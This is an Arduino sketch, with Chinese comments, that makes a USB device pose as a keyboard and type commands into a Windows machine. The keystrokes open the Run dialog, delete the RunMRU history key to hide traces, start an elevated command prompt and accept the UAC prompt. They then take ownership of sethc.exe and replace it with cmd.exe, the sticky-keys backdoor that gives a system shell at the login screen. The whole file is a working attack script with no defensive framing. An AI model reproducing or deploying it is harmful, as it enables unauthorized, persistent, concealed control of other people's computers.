void setup() {//初始化
  Keyboard.begin();//开始键盘通讯 
  delay(5000);//延时
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  delay(500); 
  Keyboard.println("CMD /c REG DELETE hkcu\\sOFTWARE\\mICROSOFT\\wINDOWS\\cURRENTvERSION\\eXPLORER\\rUNmru /F&POWERSHELL -C START-PROCESS -fILEPATH CMD -VERB RUNAS");
  delay(1500);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.print('y');
  Keyboard.release(KEY_LEFT_ALT);
 delay(1000);
  Keyboard.println();
  delay(300);
  Keyboard.println("CMD /C START /MIN TAKEOWN /F %sYSTEMrOOT%\\SYSTEM32\\SETHC.EXE&ICACLS %sYSTEMrOOT%\\SYSTEM32\\SETHC.EXE /GRANT ADMINISTARTORS:f&COPY C:\\WINDOWS\\SYSTEM32\\CMD.EXE C:\\WINDOWS\\SYSTEM32\\SETHC.EXE /y");
 Keyboard.press(KEY_CAPS_LOCK);
 Keyboard.release(KEY_CAPS_LOCK);
 Keyboard.end();//结束键盘通讯 
}
void loop()//循环
{ 
}
